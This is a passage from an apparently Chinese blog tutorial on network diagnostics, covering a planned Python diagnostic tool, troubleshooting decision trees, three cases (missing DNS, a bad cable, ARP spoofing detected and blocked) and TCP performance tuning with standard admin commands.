class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs nix">项目名称：网络诊断平台<br>Network Diagnostic Platform<br><br>功能需求：<br><br><span class="hljs-number">1</span>. 基础诊断<br>   ✅ Ping测试（连通性、RTT、丢包率）<br>   ✅ Traceroute（路径追踪）<br>   ✅ DNS查询<br>   ✅ 端口扫描<br><br><span class="hljs-number">2</span>. 协议分析<br>   ✅ IP地址计算<br>   ✅ 子网划分<br>   ✅ ARP表查看<br>   ✅ 路由表分析<br><br><span class="hljs-number">3</span>. 网络监控<br>   ✅ 实时流量监控<br>   ✅ ARP监控<br>   ✅ 连接状态监控<br>   ✅ 性能统计<br><br><span class="hljs-number">4</span>. 故障诊断<br>   ✅ 自动诊断网络问题<br>   ✅ 生成诊断报告<br>   ✅ 提供解决建议<br><br><span class="hljs-number">5</span>. 可视化<br>   ✅ 网络拓扑图<br>   ✅ 性能图表<br>   ✅ 实时监控面板<br><br>技术栈：<br><span class="hljs-operator">-</span> 语言：Python <span class="hljs-number">3.8</span><span class="hljs-operator">+</span><br><span class="hljs-operator">-</span> 网络库：socket, scapy<br><span class="hljs-operator">-</span> 可视化：matplotlib (可选)<br><span class="hljs-operator">-</span> 界面：命令行 <span class="hljs-operator">+</span> Web (可选)<br><br>项目结构：<br>network_diagnostic<span class="hljs-symbol">/</span><br>├── core<span class="hljs-symbol">/</span><br>│   ├── ping.py          <span class="hljs-comment"># Ping功能</span><br>│   ├── traceroute.py    <span class="hljs-comment"># Traceroute功能</span><br>│   ├── dns.py           <span class="hljs-comment"># DNS查询</span><br>│   ├── port_scan.py     <span class="hljs-comment"># 端口扫描</span><br>│   └── arp.py           <span class="hljs-comment"># ARP工具</span><br>├── analysis<span class="hljs-symbol">/</span><br>│   ├── ip_calc.py       <span class="hljs-comment"># IP计算</span><br>│   ├── route.py         <span class="hljs-comment"># 路由分析</span><br>│   └── performance.py   <span class="hljs-comment"># 性能分析</span><br>├── monitor<span class="hljs-symbol">/</span><br>│   ├── traffic.py       <span class="hljs-comment"># 流量监控</span><br>│   └── connection.py    <span class="hljs-comment"># 连接监控</span><br>├── diagnosis<span class="hljs-symbol">/</span><br>│   └── auto_diagnose.py <span class="hljs-comment"># 自动诊断</span><br>├── utils<span class="hljs-symbol">/</span><br>│   └── helpers.py       <span class="hljs-comment"># 工具函数</span><br>└── main.py              <span class="hljs-comment"># 主程序</span><br></code></pre></td></tr></table></figure><h3 id="2-2-核心功能实现"><a href="#2-2-核心功能实现" class="headerlink" title="2.2 核心功能实现"></a>2.2 核心功能实现</h3><p><strong>综合诊断流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs markdown">自动诊断流程：<br><br><span class="hljs-bullet">1.</span> 收集信息阶段<br>   ├─ 本机网络配置<br>   │  ├─ IP地址<br>   │  ├─ 子网掩码<br>   │  ├─ 默认网关<br>   │  └─ DNS服务器<br>   ├─ ARP缓存<br>   └─ 路由表<br><br><span class="hljs-bullet">2.</span> 连通性测试<br>   ├─ Ping默认网关<br>   │  ├─ 成功：网关可达<br>   │  └─ 失败：本地网络问题<br>   ├─ Ping DNS服务器<br>   │  ├─ 成功：DNS服务器可达<br>   │  └─ 失败：DNS配置或路由问题<br>   └─ Ping外网地址（8.8.8.8）<br><span class="hljs-code">      ├─ 成功：外网连接正常</span><br><span class="hljs-code">      └─ 失败：路由或防火墙问题</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">3.</span> DNS测试<br>   ├─ 解析常见域名<br>   │  ├─ 成功：DNS正常<br>   │  └─ 失败：DNS服务器问题<br>   └─ 测试解析时间<br><span class="hljs-code">      ├─ &lt;100ms：正常</span><br><span class="hljs-code">      └─ &gt;500ms：DNS慢</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">4.</span> 路径分析<br>   ├─ Traceroute到目标<br>   ├─ 分析跳数<br>   ├─ 检测延迟突增<br>   └─ 识别问题节点<br><br><span class="hljs-bullet">5.</span> 性能评估<br>   ├─ 丢包率<br>   ├─ 平均延迟<br>   ├─ 延迟抖动<br>   └─ 带宽估算<br><br><span class="hljs-bullet">6.</span> 问题诊断<br>   ├─ 分析收集的数据<br>   ├─ 识别问题类型<br>   ├─ 定位问题位置<br>   └─ 生成诊断报告<br><br><span class="hljs-bullet">7.</span> 建议方案<br>   └─ 提供解决方案<br></code></pre></td></tr></table></figure><p><strong>诊断决策树</strong>：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs autoit">网络问题诊断决策树：<br><br>无法上网？<br>├─ <span class="hljs-built_in">Ping</span>网关成功？<br>│  ├─ 是<br>│  │  ├─ <span class="hljs-built_in">Ping</span>外网IP成功？<br>│  │  │  ├─ 是<br>│  │  │  │  ├─ DNS解析成功？<br>│  │  │  │  │  ├─ 是 → 应用层问题<br>│  │  │  │  │  └─ 否 → DNS配置问题<br>│  │  │  │          解决：检查DNS设置<br>│  │  │  └─ 否 → 路由问题<br>│  │  │       解决：检查路由表、防火墙<br>│  │  └─ <span class="hljs-built_in">Ping</span>网关成功但速度慢？<br>│  │       ├─ 检查网关负载<br>│  │       ├─ 检查ARP表<br>│  │       └─ 可能ARP欺骗<br>│  └─ 否 → 本地网络问题<br>│       ├─ 检查网线/WiFi连接<br>│       ├─ 检查IP配置<br>│       ├─ 检查子网掩码<br>│       └─ 检查ARP缓存<br><br>网速慢？<br>├─ <span class="hljs-built_in">Ping</span>延迟高？<br>│  ├─ 是 → 网络拥塞或距离远<br>│  │    ├─ Traceroute找瓶颈<br>│  │    └─ 检查链路质量<br>│  └─ 否 → 应用层或服务器问题<br>├─ 丢包率高？<br>│  └─ 是 → 链路质量问题<br>│       ├─ 检查网线<br>│       ├─ 检查交换机<br>│       └─ 检查WiFi信号<br>└─ 间歇性慢？<br>    └─ 可能是：<br>        ├─ 网络拥塞（高峰期）<br>        ├─ DNS问题<br>        └─ 负载均衡切换<br></code></pre></td></tr></table></figure><hr><h2 id="3-网络排错案例"><a href="#3-网络排错案例" class="headerlink" title="3. 网络排错案例"></a>3. 网络排错案例</h2><h3 id="3-1-案例1：无法访问网站"><a href="#3-1-案例1：无法访问网站" class="headerlink" title="3.1 案例1：无法访问网站"></a>3.1 案例1：无法访问网站</h3><p><strong>问题描述</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">用户报告：无法访问www.example.com<br><br>初步信息：<br><span class="hljs-bullet">- </span>浏览器显示&quot;无法访问此网站&quot;<br><span class="hljs-bullet">- </span>其他网站也无法访问<br><span class="hljs-bullet">- </span>昨天还正常<br></code></pre></td></tr></table></figure><p><strong>排错步骤</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs routeros">步骤1: 确认问题范围<br>Q: 是所有设备都无法访问，还是只有这台？<br>A: 只有这台电脑<br><br>结论：不是网络整体问题，是本机配置问题<br><br>步骤2: 检查本机连接<br>命令：<br><span class="hljs-comment"># Windows</span><br>ipconfig /all<br><br><span class="hljs-comment"># Linux</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>addr show<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip route </span>show<br><br>检查：<br>✅ IP地址：192.168.1.100（正常）<br>✅ 子网掩码：255.255.255.0（正常）<br>✅ 默认网关：192.168.1.1（正常）<br>❌ DNS服务器：未配置！<br><br>步骤3: 测试网关连通性<br>命令：<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>192.168.1.1<br><br>结果：<br>✅ 成功，网关可达<br><br>步骤4: 测试外网IP<br>命令：<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>8.8.8.8<br><br>结果：<br>✅ 成功，外网连接正常<br><br>步骤5: 测试DNS<br>命令：<br>nslookup www.example.com<br><br>结果：<br>❌ 失败，DNS查询超时<br><br>诊断结论：<br>DNS配置问题！<br><br>解决方案：<br>配置DNS服务器<br><br><span class="hljs-comment"># Windows</span><br>netsh<span class="hljs-built_in"> interface ip </span><span class="hljs-built_in">set</span><span class="hljs-built_in"> dns </span><span class="hljs-string">&quot;以太网&quot;</span> static 8.8.8.8<br>netsh<span class="hljs-built_in"> interface ip </span><span class="hljs-built_in">add</span><span class="hljs-built_in"> dns </span><span class="hljs-string">&quot;以太网&quot;</span> 8.8.4.4 <span class="hljs-attribute">index</span>=2<br><br><span class="hljs-comment"># Linux</span><br>sudo nano /etc/resolv.conf<br>nameserver 8.8.8.8<br>nameserver 8.8.4.4<br><br>验证：<br>nslookup www.example.com<br>→ 成功解析<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>www.example.com<br>→ 成功<br><br>问题解决！<br><br>根本原因：<br>DHCP服务器未分配DNS，或手动配置IP时忘记配置DNS<br></code></pre></td></tr></table></figure><h3 id="3-2-案例2：网速突然变慢"><a href="#3-2-案例2：网速突然变慢" class="headerlink" title="3.2 案例2：网速突然变慢"></a>3.2 案例2：网速突然变慢</h3><p><strong>问题描述</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">用户报告：下载速度从100Mbps降到1Mbps<br><br>初步信息：<br><span class="hljs-bullet">- </span>连接正常，但速度很慢<br><span class="hljs-bullet">- </span>Ping正常，延迟不高<br><span class="hljs-bullet">- </span>局域网内其他机器正常<br></code></pre></td></tr></table></figure><p><strong>排错步骤</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs ldif">步骤1: 基础测试<br>命令：<br>ping -c 100 192.168.1.1<br><br>结果：<br>100 packets transmitted, 100 received, 0% packet loss<br>rtt min/avg/max = 1.2/1.5/2.0 ms<br><br>✅ Ping正常，无丢包，延迟低<br><br>步骤2: 检查连接速度<br>命令：<br><span class="hljs-comment"># Linux</span><br>ethtool eth0<br><br>结果：<br><span class="hljs-attribute">Speed</span>: 10Mb/s          ← 问题！应该是1000Mb/s<br><span class="hljs-attribute">Duplex</span>: Half           ← 问题！应该是Full<br><br>诊断：<br>网卡协商到了10Mbps半双工！<br><br>步骤3: 检查物理连接<br>检查：<br><span class="hljs-literal">-</span> 网线：5类线（Cat5）← 太老了<br><span class="hljs-literal">-</span> 网线长度：50米<br><span class="hljs-literal">-</span> 网线状态：磨损<br><br>步骤4: 解决方案<br>方案1（临时）：<br>强制网卡速度和双工模式<br><span class="hljs-comment"># Linux</span><br>sudo ethtool -s eth0 speed 100 duplex full autoneg off<br><br>方案2（永久）：<br>更换Cat6或Cat6a网线<br><br>执行方案2：<br>更换新网线后<br><br>测试：<br>ethtool eth0<br><span class="hljs-attribute">Speed</span>: 1000Mb/s<br><span class="hljs-attribute">Duplex</span>: Full<br><br>下载测试：<br>速度恢复到100Mbps<br><br>问题解决！<br><br>根本原因：<br>网线老化或质量差，导致协商速度降级<br><br>经验教训：<br><span class="hljs-literal">-</span> 物理层问题也会导致速度慢<br><span class="hljs-literal">-</span> 检查问题要从底层开始<br><span class="hljs-literal">-</span> 网线质量很重要<br></code></pre></td></tr></table></figure><h3 id="3-3-案例3：间歇性断网"><a href="#3-3-案例3：间歇性断网" class="headerlink" title="3.3 案例3：间歇性断网"></a>3.3 案例3：间歇性断网</h3><p><strong>问题描述</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">用户报告：每隔几分钟断网一次，然后自动恢复<br><br>初步信息：<br><span class="hljs-bullet">- </span>断网持续10-30秒<br><span class="hljs-bullet">- </span>不定期发生<br><span class="hljs-bullet">- </span>影响整个办公室<br></code></pre></td></tr></table></figure><p><strong>排错步骤</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs routeros">步骤1: 监控连接<br>命令：<br><span class="hljs-comment"># 持续ping网关</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-i 0.2 192.168.1.1 | ts <span class="hljs-string">&#x27;[%Y-%m-%d %H:%M:%S]&#x27;</span><br><br>观察：<br>[2025-01-15 10:15:23] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.5 ms<br>[2025-01-15 10:15:23] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.3 ms<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:15:45] Request timeout<br>[2025-01-15 10:16:02] 64 bytes <span class="hljs-keyword">from</span> 192.168.1.1: <span class="hljs-attribute">time</span>=1.4 ms<br><br>每隔几分钟超时一次<br><br>步骤2: 检查ARP表<br>命令：<br>watch -n 1 <span class="hljs-string">&#x27;arp -a&#x27;</span><br><br>观察：<br>网关MAC地址在变化！<br><br>正常：<br>192.168.1.1  aa:bb:cc:dd:ee:ff  (路由器)<br><br>异常时：<br>192.168.1.1  11:22:33:44:55:66  (未知设备)<br><br>诊断：<br>ARP欺骗攻击！<br><br>步骤3: 监控ARP<br>命令：<br>sudo tcpdump -i eth0 arp -vv<br><br>发现：<br>大量ARP应答来自 11:22:33:44:55:66<br>声称自己是192.168.1.1<br><br>步骤4: 定位攻击源<br>根据MAC地址查找：<br>- 检查交换机MAC地址表<br>- 找到对应端口<br>- 定位到某台电脑<br><br>检查该电脑：<br>发现安装了某<span class="hljs-string">&quot;网络加速软件&quot;</span><br>该软件会进行ARP欺骗以<span class="hljs-string">&quot;加速&quot;</span><br><br>步骤5: 解决方案<br>立即解决：<br>1. 关闭该软件<br>2. 静态绑定网关ARP<br>   arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br>长期方案：<br>1. 交换机启用DAI（动态ARP检测）<br>2. 端口安全<br>3. 网络监控<br><br>配置交换机（Cisco）：<br>Switch(config)#<span class="hljs-built_in"> ip </span>arp inspection<span class="hljs-built_in"> vlan </span>1-100<br>Switch(config)#<span class="hljs-built_in"> ip </span>dhcp snooping<br>Switch(config)#<span class="hljs-built_in"> ip </span>dhcp snooping<span class="hljs-built_in"> vlan </span>1-100<br><br>问题解决！<br><br>根本原因：<br>用户安装了恶意软件导致ARP欺骗<br><br>经验教训：<br>- ARP欺骗是常见攻击<br>- 监控ARP变化很重要<br>- 交换机安全配置必不可少<br>- 用户安全意识需要提高<br></code></pre></td></tr></table></figure><hr><h2 id="4-性能优化"><a href="#4-性能优化" class="headerlink" title="4. 性能优化"></a>4. 性能优化</h2><h3 id="4-1-网络性能指标"><a href="#4-1-网络性能指标" class="headerlink" title="4.1 网络性能指标"></a>4.1 网络性能指标</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs markdown">关键性能指标（KPI）：<br><br><span class="hljs-bullet">1.</span> 带宽（Bandwidth）<br><span class="hljs-bullet">   -</span> 定义：单位时间传输的数据量<br><span class="hljs-bullet">   -</span> 单位：bps, Mbps, Gbps<br><span class="hljs-bullet">   -</span> 测试工具：iperf, speedtest<br><br><span class="hljs-bullet">2.</span> 延迟（Latency/RTT）<br><span class="hljs-bullet">   -</span> 定义：数据往返时间<br><span class="hljs-bullet">   -</span> 单位：ms（毫秒）<br><span class="hljs-bullet">   -</span> 评价标准：<br><span class="hljs-bullet">     *</span> &lt;50ms：优秀<br><span class="hljs-bullet">     *</span> 50-100ms：良好<br><span class="hljs-bullet">     *</span> 100-200ms：一般<br><span class="hljs-bullet">     *</span> &gt;200ms：较差<br><span class="hljs-bullet">   -</span> 测试工具：ping<br><br><span class="hljs-bullet">3.</span> 抖动（Jitter）<br><span class="hljs-bullet">   -</span> 定义：延迟的变化<br><span class="hljs-bullet">   -</span> 单位：ms<br><span class="hljs-bullet">   -</span> 评价标准：<br><span class="hljs-bullet">     *</span> &lt;10ms：优秀<br><span class="hljs-bullet">     *</span> 10-30ms：良好<br><span class="hljs-bullet">     *</span> &gt;30ms：需要优化<br><span class="hljs-bullet">   -</span> 影响：实时应用（VoIP、视频会议）<br><br><span class="hljs-bullet">4.</span> 丢包率（Packet Loss）<br><span class="hljs-bullet">   -</span> 定义：丢失数据包的比例<br><span class="hljs-bullet">   -</span> 单位：%<br><span class="hljs-bullet">   -</span> 评价标准：<br><span class="hljs-bullet">     *</span> &lt;0.1%：优秀<br><span class="hljs-bullet">     *</span> 0.1-1%：良好<br><span class="hljs-bullet">     *</span> 1-3%：一般<br><span class="hljs-bullet">     *</span> &gt;3%：较差<br><span class="hljs-bullet">   -</span> 测试工具：ping -c 1000<br><br><span class="hljs-bullet">5.</span> 吞吐量（Throughput）<br><span class="hljs-bullet">   -</span> 定义：实际传输速率<br><span class="hljs-bullet">   -</span> 通常低于带宽（协议开销）<br><span class="hljs-bullet">   -</span> 测试工具：iperf<br><br><span class="hljs-bullet">6.</span> 并发连接数<br><span class="hljs-bullet">   -</span> 定义：同时活跃的连接数<br><span class="hljs-bullet">   -</span> 影响服务器性能<br><span class="hljs-bullet">   -</span> 查看：netstat -an | wc -l<br></code></pre></td></tr></table></figure><h3 id="4-2-优化技巧"><a href="#4-2-优化技巧" class="headerlink" title="4.2 优化技巧"></a>4.2 优化技巧</h3><p><strong>客户端优化</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. TCP参数调优<br><span class="hljs-comment"># Linux</span><br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_window_scaling</span>=1<br>sudo sysctl -w net.core.<span class="hljs-attribute">rmem_max</span>=16777216<br>sudo sysctl -w net.core.<span class="hljs-attribute">wmem_max</span>=16777216<br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_rmem</span>=<span class="hljs-string">&#x27;4096 87380 16777216&#x27;</span><br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_wmem</span>=<span class="hljs-string">&#x27;4096 65536 16777216&#x27;</span><br><br>2. 禁用不需要的服务<br><span class="hljs-comment"># 减少网络开销</span><br>sudo systemctl <span class="hljs-built_in">disable</span> bluetooth<br>sudo systemctl <span class="hljs-built_in">disable</span> avahi-daemon<br><br>3. DNS优化<br><span class="hljs-comment"># 使用快速DNS服务器</span><br>nameserver 1.1.1.1      # Cloudflare<br>nameserver 8.8.8.8      # Google<br>nameserver 114.114.114.114  # 114DNS<br><br><span class="hljs-comment"># DNS缓存</span><br>sudo systemctl <span class="hljs-built_in">enable</span> systemd-resolved<br><br>4. MTU优化<br><span class="hljs-comment"># 查找最佳MTU</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-M <span class="hljs-keyword">do</span> -s 1472 目标IP<br><span class="hljs-comment"># 如果成功，MTU = 1472 + 28 = 1500（最佳）</span><br><span class="hljs-comment"># 如果失败，减小1472直到成功</span><br><br><span class="hljs-comment"># 设置MTU</span><br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> dev eth0 mtu 1500<br><br>5. 连接数优化<br><span class="hljs-comment"># 增加连接数限制</span><br>ulimit -n 65535<br><br><span class="hljs-comment"># 永久配置 /etc/security/limits.conf</span><br>* soft nofile 65535<br>* hard nofile 65535<br></code></pre></td></tr></table></figure><p><strong>服务器优化</strong>：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">1</span>. 网络栈优化<br><span class="hljs-comment"># /etc/sysctl.conf</span><br><br><span class="hljs-comment"># TCP连接队列</span><br><span class="hljs-string">net</span>.<span class="hljs-string">core</span>.<span class="hljs-string">somaxconn</span> = <span class="hljs-string">65535</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_max_syn_backlog</span> = <span class="hljs-string">8192</span><br><br><span class="hljs-comment"># TCP 